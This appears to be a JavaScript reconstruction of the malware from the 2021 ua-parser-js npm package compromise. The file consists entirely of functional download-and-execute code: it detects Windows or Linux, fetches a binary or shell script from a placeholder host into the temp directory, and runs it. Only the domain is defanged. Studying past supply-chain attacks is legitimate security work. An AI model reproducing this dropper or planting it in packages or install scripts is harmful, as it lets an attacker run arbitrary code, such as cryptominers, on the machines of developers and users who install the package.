// Reconstructed from the October 2021 ua-parser-js compromise (CVE-2021-41265)
// The original downloaded a cryptominer binary and executed it.
// All URLs replaced with safe example domains.

const { exec } = require('child_process');
const https = require('https');
const os = require('os');
const fs = require('fs');
const path = require('path');

const platform = os.platform();
const tmpDir = os.tmpdir();

if (platform === 'win32') {
  const filePath = path.join(tmpDir, 'jsextension.exe');
  https.get('https://citationsherbe.example.com/sdd.dll', (res) => {
    const file = fs.createWriteStream(filePath);
    res.pipe(file);
    file.on('finish', () => {
      file.close();
      exec(filePath);
    });
  });
} else if (platform === 'linux') {
  const filePath = path.join(tmpDir, 'jsextension');
  https.get('https://citationsherbe.example.com/sdd.sh', (res) => {
    const file = fs.createWriteStream(filePath);
    res.pipe(file);
    file.on('finish', () => {
      file.close();
      exec('chmod +x ' + filePath + ' && ' + filePath);
    });
  });
}
